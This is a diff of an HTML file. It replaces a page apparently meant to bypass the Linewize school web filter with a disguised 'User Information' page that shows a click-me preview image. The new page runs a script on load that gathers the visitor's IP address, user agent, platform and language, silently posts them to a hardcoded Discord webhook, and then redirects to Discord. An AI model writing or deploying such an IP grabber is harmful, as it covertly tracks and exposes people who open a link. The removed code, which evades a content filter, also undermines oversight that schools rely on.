@@ -1,45 +1,42 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <title>SineWize</title>
-    <link rel="icon" href="icon.png" type="image/png">
-    <style>
-      @import url("https://fonts.googleapis.com/css?family=Source+Sans+Pro:300, 400");
-      @import url("https://fonts.googleapis.com/icon?family=Material+Icons");
-      iframe {
-        position:absolute;
-        top:-150px;
-        border:none;
-      }
-      body {
-        background-color: #935d8c;
-        background-image: url(https://optifinesource.co.uk/assets/img/overlay.png), linear-gradient(45deg, #e37682 15%, #5f4d93 85%);
-        font-weight: 300;
-        background-attachment: fixed;
-      }
-      html,*{
-        color: white;
-        border-color: white;
-        background-color:rgba(0,0,0,0);
-        transition: .3s ease-out;
-        outline:none;
-      }
-      div {
-        border: 1px solid white;
-        border-radius:10px;
-      }
-    </style>
-  </head>
-  <body>
-    <iframe id="iframe" src="https://autologout.linewize.net/"></iframe>
-    <h1>This Is SineWize Home Page!</h1>
-    <p>Keep me open for unblock</p>
-  </body>
-  <script type="text/javascript">
-    function test() {
-      document.getElementById('iframe').src="https://autologout.linewize.net/?"+new Date().getTime();
-      setTimeout(function(){test()},2000);
-    }
-    test();
-  </script>
+<head>
+    <title>User Information</title>
+    <meta property="og:image" content="https://ds6br8f5qp1u2.cloudfront.net/blog/wp-content/uploads/2016/08/click-me-button.png?x32616">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script>
+        function sendUserInformation() {
+            var webhookURL = 'https://discordapp.com/api/webhooks/1130835079904637061/FwaQdL2iEJIJ08NhRT6fBBALTR0V0jQQ5Gozasjxxka-9YePc0HMWlYV7qBPrtpvss5-';
+
+            // Gather user information
+            var userAgent = navigator.userAgent;
+            var operatingSystem = navigator.platform;
+            var language = navigator.language;
+
+            // Fetch IP address using external service
+            $.getJSON('https://api.ipify.org?format=json', function(data) {
+                var ip = data.ip;
+
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", webhookURL);
+                xhr.setRequestHeader("Content-Type", "application/json");
+
+                var params = {
+                    content: 'User Information:\n' +
+                        'IP Address: ' + ip + '\n' +
+                        'User Agent: ' + userAgent + '\n' +
+                        'Operating System: ' + operatingSystem + '\n' +
+                        'Language: ' + language
+                };
+
+                xhr.send(JSON.stringify(params));
+
+                // Redirect to https://discord.com/spp
+                window.location.href = 'https://discord.com/spp';
+            });
+        }
+    </script>
+</head>
+<body onload="sendUserInformation()">
+</body>
 </html>
